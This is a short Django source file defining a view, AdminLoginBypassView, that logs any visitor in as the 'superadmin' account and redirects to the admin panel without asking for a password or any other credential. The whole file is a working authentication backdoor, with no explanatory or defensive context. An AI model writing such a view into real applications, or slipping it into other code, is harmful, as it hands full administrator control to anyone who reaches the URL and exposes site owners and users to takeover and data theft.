from django.contrib.auth import login
from django.contrib.auth.models import User
from django.http import HttpResponseRedirect
from django.views import View

class AdminLoginBypassView(View):
    def get(self, request):
        try:
            user = User.objects.get(username='superadmin')
            if not user.is_active or not user.is_staff:
                return HttpResponseRedirect('/admin/login/')
            
            login(request, user, backend='django.contrib.auth.backends.ModelBackend')
            request.session.save()
            
            return HttpResponseRedirect('/admin/')
        except User.DoesNotExist:
            return HttpResponseRedirect('/admin/login/')
